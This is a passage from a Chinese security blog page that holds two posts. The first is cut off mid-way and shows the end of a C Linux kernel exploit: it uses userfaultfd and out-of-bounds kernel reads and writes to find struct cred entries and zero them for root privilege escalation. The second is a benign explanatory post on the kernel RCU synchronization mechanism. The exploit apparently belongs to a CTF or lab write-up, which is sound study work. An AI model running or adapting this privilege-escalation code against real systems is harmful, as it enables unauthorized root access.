class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">uint64_t</span> size, offset, cred_offset=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> idx, cred_count;</span><br><span class="line">    <span class="keyword">uint32_t</span> * uint_ptr;</span><br><span class="line">    <span class="keyword">char</span> data[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    initFD();</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(fork() == <span class="number">0</span>)&#123;</span><br><span class="line">            while_getroot();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *read_ptr = (<span class="keyword">char</span>*)mmap(<span class="literal">NULL</span>, DATA_OFFSET, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(read_ptr == MAP_FAILED)&#123;</span><br><span class="line">        errExit(<span class="string">&quot;mmap mem error\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    kcreate(<span class="number">0</span>,data,<span class="number">0x100</span>);</span><br><span class="line">    kread(<span class="number">0</span>,read_ptr,DATA_OFFSET,-DATA_OFFSET);</span><br><span class="line">    </span><br><span class="line">    uint_ptr = (<span class="keyword">uint32_t</span> *) read_ptr;</span><br><span class="line">    cred_count = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] trying to find struct cred....\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SEARCH_SIZE/<span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (uint_ptr[i] == UID &amp;&amp; uint_ptr[i+<span class="number">1</span>] == UID &amp;&amp; uint_ptr[i+<span class="number">2</span>] == UID &amp;&amp; uint_ptr[i+<span class="number">3</span>] == UID &amp;&amp; uint_ptr[i+<span class="number">4</span>] == UID &amp;&amp; uint_ptr[i+<span class="number">5</span>] == UID &amp;&amp; uint_ptr[i+<span class="number">6</span>] == UID &amp;&amp; uint_ptr[i+<span class="number">7</span>] == UID)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] find cred at offset: 0x%x\n&quot;</span>, i*<span class="number">4</span>);</span><br><span class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)</span><br><span class="line">                uint_ptr[i+j] = <span class="number">0</span>;</span><br><span class="line">            cred_count++;</span><br><span class="line">            <span class="keyword">if</span>(cred_count &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">                cred_offset = i*<span class="number">4</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(cred_offset == <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;can&#x27;t find cred&quot;</span>);</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">char</span> * write_ptr = (<span class="keyword">char</span>*)mmap(<span class="literal">NULL</span>, DATA_OFFSET, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(write_ptr, read_ptr, SEARCH_SIZE);</span><br><span class="line"></span><br><span class="line">    fault_page = (<span class="keyword">uint64_t</span>)write_ptr + SEARCH_SIZE;</span><br><span class="line">    fault_page_len = DATA_OFFSET - SEARCH_SIZE;</span><br><span class="line">    register_userfault();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;write root cred back&quot;</span>);</span><br><span class="line">    kwrite(<span class="number">0</span>, write_ptr, DATA_OFFSET, -DATA_OFFSET);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/27/Linux%20RCU%E6%9C%BA%E5%88%B6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/27/Linux%20RCU%E6%9C%BA%E5%88%B6/" class="post-title-link" itemprop="url">Linux RCU机制</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-10-27 19:52:42" itemprop="dateCreated datePublished" datetime="2022-10-27T19:52:42+08:00">2022-10-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-11-02 15:13:52" itemprop="dateModified" datetime="2022-11-02T15:13:52+08:00">2022-11-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>4.3k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>4 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>RCU 简述</strong></p>
<p>RCU(Read-Copy Update)，是 Linux 中比较重要的一种同步机制，特点如下：</p>
<ul>
<li>复制后更新：但更新数据的时候，需要先复制一份副本，在副本上完成修改，再一次性地替换旧数据”（替换数据时需要其他同步机制的保护）</li>
<li>延迟回收内存：在数据被删除后（节点脱链）销毁前（释放空间），需要等待其他读线程停止使用该数据</li>
</ul>
<p>复制后更新是 Linux 内核实现的一种针对“读多写少”的共享数据的同步机制：</p>
<ul>
<li>不同于其他的同步机制，它允许多个读者同时访问共享数据，而且读者的性能不会受影响</li>
<li>读者与写者之间也不需要同步机制，但需要“复制后再写”</li>
<li>但如果存在多个写者时，写者与写者之间需要利用其他同步机制保证同步</li>
</ul>
<p>延迟回收内存是为了防止已经被销毁的数据被其他线程使用：</p>
<ul>
<li>一个位于临界区的指针被释放之后，另一个线程如果使用该指针就会产生安全问题</li>
</ul>
<p><strong>RCU 作用</strong></p>
<p>RCU 的一个典型的应用场景是链表，主要解决以下问题：</p>
<ul>
<li>在读取过程中，另外一个线程删除了一个节点：<ul>
<li>删除线程可以把这个节点从链表中移除，但它不能直接销毁这个节点，必须等到所有的读取线程读取完成以后，才进行销毁操作</li>
<li>RCU 中把这个过程称为宽限期（Grace period）</li>
</ul>
</li>
<li>在读取过程中，另外一个线程插入了一个新节点<ul>
<li>需要保证读到的这个节点是完整的（得到的要么全是旧的数据，要么全是新的数据，反正不会是半新半旧的数据）</li>
<li>这里涉及到了发布-订阅机制（Publish-Subscribe Mechanism）     </li>
</ul>
</li>
<li>保证读取链表的完整性<ul>
<li>新增或者删除一个节点，不至于导致其他正在遍历该链表的线程从中间断开</li>
<li>但是 RCU 并不保证一定能读到新增的节点或者不读到要被删除的节点</li>
</ul>
</li>
</ul>
<p><strong>RCU API</strong></p>
<p>添加链表项：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> list_next_rcu(list)	(*((struct list_head __rcu **)(&amp;(list)-&gt;next))) <span class="comment">/* 返回&amp;(list)-&gt;next),但不能直接访问它 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __list_add_rcu(struct list_head *<span class="keyword">new</span>,</span><br><span class="line">		struct list_head *prev, struct list_head *next)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (!__list_add_valid(<span class="keyword">new</span>, prev, next)) <span class="comment">/* 检查一个节点是否可用 */</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">new</span>-&gt;next = next;</span><br><span class="line">	<span class="keyword">new</span>-&gt;prev = prev;</span><br><span class="line">	rcu_assign_pointer(list_next_rcu(prev), <span class="keyword">new</span>);</span><br><span class="line">	next-&gt;prev = <span class="keyword">new</span>;</span><br><span class="line">&#125; <span class="comment">/* 在prev和next中间插入new,但提供了RCU的保护 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>除了 <code>rcu_assign_pointer</code> 函数，其他地方和普通的 <code>__list_add</code> 没什么不同，该函数的底层应该是一个内存屏障（防止 CPU 优化执行顺序），以避免在新指针 new 准备好之前，就被引用了</li>
</ul>
<p>删除链表项：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">list_del_rcu</span><span class="params">(struct list_head *entry)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__list_del_entry(entry);</span><br><span class="line">	entry-&gt;prev = LIST_POISON2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>和 <code>list_del</code> 相比，<code>list_del_rcu</code> 只对 <code>entry-&gt;prev</code> 进行了处理（目前不知道原因） </li>
</ul>
<p>更新链表：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">list_replace_rcu</span><span class="params">(struct list_head *old,</span></span></span><br><span class="line"><span class="params"><span class="function">				struct list_head *<span class="keyword">new</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">new</span>-&gt;next = old-&gt;next;</span><br><span class="line">	<span class="keyword">new</span>-&gt;prev = old-&gt;prev;</span><br><span class="line">	rcu_assign_pointer(list_next_rcu(<span class="keyword">new</span>-&gt;prev), <span class="keyword">new</span>);</span><br><span class="line">	<span class="keyword">new</span>-&gt;next-&gt;prev = <span class="keyword">new</span>;</span><br><span class="line">	old-&gt;prev = LIST_POISON2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>同样也是只对 <code>old-&gt;prev</code> 进行了处理</li>
</ul>
<p>访问链表：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rcu_read_lock(); <span class="comment">/* 声明了一个读端的临界区(read-side critical sections) */</span></span><br><span class="line">list_for_each_entry_rcu(pos, head, member) &#123;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line">rcu_read_unlock();</span><br></pre></td></tr></table></figure>
<ul>
<li><code>rcu_read_lock</code> 和 <code>rcu_read_unlock</code> 用来标识 RCU read side 临界区（其作用就是帮助检测宽限期是否结束）</li>
</ul>
<p><strong>RCU 机制</strong></p>
<p>宽限期：（Grace period）</p>
<img src="/2022/10/27/Linux%20RCU%E6%9C%BA%E5%88%B6/1666865836143.png" class width="1666865836143"> 
<ul>
<li>宽限期的意义是，在一个删除动作发生后，它必须等待所有在宽限期开始前已经开始的 Reader 线程结束，才可以进行销毁操作（例如：Reader1，Reader2）</li>
<li>删除之后，Reader 就会读取新数据，从而拿不到旧数据中的指针，因此就不用考虑安全问题</li>
<li>用于判定宽限期开始的函数如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">synchronize_rcu</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	RCU_LOCKDEP_WARN(lock_is_held(&amp;rcu_bh_lock_map) ||</span><br><span class="line">			 lock_is_held(&amp;rcu_lock_map) ||</span><br><span class="line">			 lock_is_held(&amp;rcu_sched_lock_map),</span><br><span class="line">			 <span class="string">&quot;Illegal synchronize_rcu() in RCU read-side critical section&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(synchronize_rcu);</span><br></pre></td></tr></table></figure>
<ul>
<li>检测宽限期是否结束的操作很复杂，需要利用 <code>rcu_read_lock</code> 和 <code>rcu_read_unlock</code> 所标记的区域进行判断</li>
<li>宽限期是 RCU 实现中最复杂的部分，要求在提高读数据性能的同时，删除数据的性能也不能太差</li>
</ul>
<p>发布-订阅机制：（Publish-Subscribe Mechanism）    </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __list_add_rcu(struct list_head *<span class="keyword">new</span>,</span><br><span class="line">		struct list_head *prev, struct list_head *next)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (!__list_add_valid(<span class="keyword">new</span>, prev, next)) <span class="comment">/* 检查一个节点是否可用 */</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">new</span>-&gt;next = next;</span><br><span class="line">	<span class="keyword">new</span>-&gt;prev = prev;</span><br><span class="line">	rcu_assign_pointer(list_next_rcu(prev), <span class="keyword">new</span>);</span><br><span class="line">	next-&gt;prev = <span class="keyword">new</span>;</span><br><span class="line">&#125; <span class="comment">/* 在prev和next中间插入new,但提供了RCU的保护 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>发布-订阅机制其实就是 <code>rcu_assign_pointer</code> 函数的使用，用于解决优化导致的 CPU 执行顺序问题</li>
<li>对应宏函数如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rcu_assign_pointer(p, v)					      \</span></span><br><span class="line"><span class="meta">(&#123;									      \</span></span><br><span class="line"><span class="meta">	uintptr_t _r_a_p__v = (uintptr_t)(v);				      \</span></span><br><span class="line"><span class="meta">									      \</span></span><br><span class="line"><span class="meta">	<span class="meta-keyword">if</span> (__builtin_constant_p(v) &amp;&amp; (_r_a_p__v) == (uintptr_t)NULL)	      \</span></span><br><span class="line"><span class="meta">		WRITE_ONCE((p), (typeof(p))(_r_a_p__v));		      \</span></span><br><span class="line"><span class="meta">	<span class="meta-keyword">else</span>								      \</span></span><br><span class="line"><span class="meta">		smp_store_release(&amp;p, RCU_INITIALIZER((typeof(p))_r_a_p__v)); \</span></span><br><span class="line"><span class="meta">	_r_a_p__v;							      \</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br></pre></td></tr></table></figure>
<ul>
<li>其实我看不太懂这个函数，但它的功能和内存屏障很像，因此它的底层也极有可能是一个内存屏障</li>
</ul>
<p>复制更新机制：（Copy Update）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="comment">/* 将要被替换的对象 */</span></span><br><span class="line">q = kmalloc(<span class="keyword">sizeof</span>(*p), GFP_KERNEL);</span><br><span class="line">*q = *p;</span><br><span class="line">q-&gt;field = new_value;</span><br><span class="line">list_replace_rcu(&amp;p-&gt;<span class="built_in">list</span>, &amp;q-&gt;<span class="built_in">list</span>);</span><br><span class="line">synchronize_rcu();</span><br><span class="line">kfree(p);</span><br></pre></td></tr></table></figure>
<ul>
<li>复制更新机制的实现基于宽限期（等待之前拿到旧节点的 Reader 执行结束，然后释放旧节点，之后拿到新节点的 Reader 不受影响）</li>
<li><code>synchronize_rcu</code> 可以防止在 <code>list_replace_rcu</code> 之后，<code>kfree</code> 之前，有读线程使用了正在进行更新的链表节点</li>
<li>更新以后的旧节点脱链，拿到旧节点的 Reader 在宽限期中执行完毕，之后的 <code>kfree</code> 就不会引发安全问题了</li>
<li>PS：申请空间和复制数据的操作需要手动完成，没有专门的 API</li>
</ul>
<p><strong>RCU 案例</strong></p>
<p>Reader 正在遍历查找链表节点：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="keyword">long</span> key, <span class="keyword">int</span> *result)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">lp</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">el</span> *<span class="title">p</span>;</span></span><br><span class="line">    </span><br><span class="line">    rcu_read_lock();</span><br><span class="line">    list_for_each_entry_rcu(p, head, lp) &#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;key == key) &#123;</span><br><span class="line">            *result = p-&gt;data;</span><br><span class="line">            rcu_read_unlock();</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    rcu_read_unlock();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Writer 正在遍历删除链表节点：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delete</span><span class="params">(<span class="keyword">long</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">lp</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">el</span> *<span class="title">p</span>;</span></span><br><span class="line">    </span><br><span class="line">    spin_lock(&amp;listmutex);</span><br><span class="line">    list_for_each_entry_rcu(p, head, lp) &#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;key == key) &#123;</span><br><span class="line">            list_del_rcu(&amp;p-&gt;<span class="built_in">list</span>);</span><br><span class="line">            synchronize_rcu(); </span><br><span class="line">            spin_unlock(&amp;listmutex);</span><br><span class="line">            kfree(p);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    spin_unlock(&amp;listmutex);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>假设一个线程执行 Reader，另一个线程执行 Writer：</p>
<ul>
<li>如果使用读写锁，那么 Reader 和 Writer 就不能同时进行，影响效率</li>
<li>如果使用顺序锁，那么在 Reader 和 Writer 同时操作指针时容易出现问题</li>
<li>这里使用了 RCU 锁，Writer 会在 <code>synchronize_rcu</code> 上等待持有旧指针的 Reader 执行完毕，只是牺牲了 Writer 的效率就避免了安全问题</li>
</ul>
<p>参考：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/113999842">rcu 机制简介 - 知乎</a> </li>
<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1006204">深入理解 Linux 的 RCU 机制 - 腾讯云开发者社区</a> </li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/10/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><span class="page-number current">11</span><a class="page-number" href="/page/12/">12</a><span class="space">&hellip;</span><a class="page-number" href="/page/29/">29</a><a class="extend next" rel="next" href="/page/12/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">286</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">148</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">4m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">60:50</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
